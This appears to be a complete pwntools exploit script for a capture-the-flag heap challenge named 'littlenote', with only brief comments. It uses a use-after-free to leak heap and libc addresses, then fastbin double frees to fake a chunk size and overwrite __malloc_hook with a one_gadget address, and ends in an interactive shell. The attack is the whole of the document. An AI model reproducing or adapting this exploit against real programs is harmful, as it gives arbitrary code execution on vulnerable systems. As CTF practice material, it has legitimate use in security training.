from pwn import *
#env=os.environ
#env['LD_PRELOAD']='./littlenote.so'
#context.log_level='debug'
r=process('./littlenote')
def add(cont):
    r.recvuntil('Your choice:')
    r.sendline('1')
    r.recvuntil('note')
    r.send(cont)
    r.recvuntil('?')
    r.sendline('Y')
def show(idx):
    r.recvuntil('Your choice:')
    r.sendline('2')
    r.recvuntil('?')
    r.sendline(str(idx))
def delete(idx):
    r.recvuntil('Your choice:')
    r.sendline('3')
    r.recvuntil('?')
    r.sendline(str(idx))
#use UAF to leak heap
add('0'*8)#0
add('1'*8)#1
add('2'*8)#2
add('3'*0x20)#3
add('4'*0x20)#4
gdb.attach(r)
delete(1)
delete(2)

show(2)
r.recv(1)
gdb.attach(r)
heap1=u64(r.recvuntil("\n")[:-1].ljust(8,'\x00'))
print hex(heap1)
#fastbin double free,changing size to 0xe1 and leak libc
delete(1)
gdb.attach(r)
add(p64(heap1+0x40))#5
add('6'*0x60)#6
add('7'*0x38+p64(0x7f))#7
add('z'*0x20+p64(0)+p64(0xe1))#8
delete(6)
show(2)
r.recv(1)
leakl=u64(r.recvline()[:-1].ljust(8,'\x00'))
lbase=leakl-0x7ffff7dd1b78+0x7ffff7a0d000
one=lbase+0xf02a4
mhk=leakl-0x68
#fastbin double free,changing __malloc_hook to one_shot
add('9'*0x20)#9
add('a'*0x20)#10
delete(9)
delete(10)
delete(9)
add(p64(mhk-0x23))#11
add('c'*0x60)#12
add('d'*0x38+p64(0x7f))#13
add('e'*0x13+p64(one))#14
print hex(leakl)
print hex(lbase)
print hex(one)
#trigger
delete(3)
delete(3)
#gdb.attach(r)
r.recv()
r.interactive()
